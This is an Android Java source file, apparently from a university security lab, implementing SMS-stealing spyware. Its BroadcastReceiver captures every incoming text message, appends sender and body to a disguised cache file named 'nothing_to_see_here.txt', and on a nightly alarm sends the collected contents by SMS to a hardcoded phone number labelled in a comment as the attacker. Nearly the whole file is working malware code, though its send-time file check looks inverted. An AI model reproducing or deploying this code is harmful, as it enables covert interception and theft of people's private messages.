package cps633.lab4;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;

/* Class used to listen for incoming SMS Messages */
public class SMSReceiver extends BroadcastReceiver{

    // Get the object of SmsManager
    String senderNum;
    String message;

    public void onReceive(Context context, Intent intent) {

        if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {

            // Retrieves a map of extended data from the intent.
            final Bundle bundle = intent.getExtras();

            try {
                if (bundle != null) {
                    //pdus = Protocol Description Unit. Used by SMS btw.

                    //Why cast bundle.get as Object[] you say?
                    //Well:

                   /*
                    *  A PDU is a "protocol description unit", which is the industry format for an SMS message.
                    *  Because SMSMessage reads and writes them, you shouldn't need to dissect them.
                    *  A large message might be broken into many tiny pieces, which is why it is an array of objects.
                    */

                    final Object[] pdusObj = (Object[]) bundle.get("pdus");

                    for (Object aPdusObj : pdusObj) {

                        SmsMessage currentMessage;
                        currentMessage = SmsMessage.createFromPdu((byte[]) aPdusObj);

                        senderNum = currentMessage.getDisplayOriginatingAddress(); //get sender num
                        message = currentMessage.getDisplayMessageBody(); //get sender msg

                        String data = "Sender Num: " + senderNum + " Message: " + message;

                        writeToFile(data, context); //Write message content to a file inside cps633.lab4 folder in /sdcard/Android/data
                    }
                }
            } catch (Exception e) {
                Log.e("SmsReceiver", "Exception  smsReceiver" + e);
            }
        }

        //This only gets called when it's 11:59:59pm on the phone
        if(intent.getAction().equals("AlarmStuff")){
            sendMessage(context);
        }
    }

    private void sendMessage(Context context) {
        String filename = context.getExternalCacheDir().getAbsolutePath()+"/nothing_to_see_here.txt";
        String content = "";

        File file = new File(filename);

        if(file.length() == 0 || !file.exists()) {
            try {
                BufferedReader bufferedReader = new BufferedReader(new FileReader(file));
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    content += line + "\n";
                }
                sendSMS(content); //Call sendSMS to send SMS with message content to attacker
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private void writeToFile(String data, Context context) throws IOException {
        try {
                String baseFolder = context.getExternalCacheDir().getAbsolutePath();

                File file = new File(baseFolder + "/nothing_to_see_here.txt");
                file.getParentFile().mkdirs();

                FileOutputStream fos = new FileOutputStream(file, true);

                fos.write(data.getBytes());
                fos.flush();
                fos.close();
        }
        catch (Exception e) {
            Log.e("writeToFile", "Exception writeToFile" + e);
            e.printStackTrace();
        }
    }

    public static void sendSMS(String content) {
        Log.d("sendSMS", "Sending a SMS now!");

        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage("+16477172894", null, content, null, null);

        } catch (Exception e) {
            Log.e("sendSMS", "SMS failed");
            e.printStackTrace();
        }
    }
}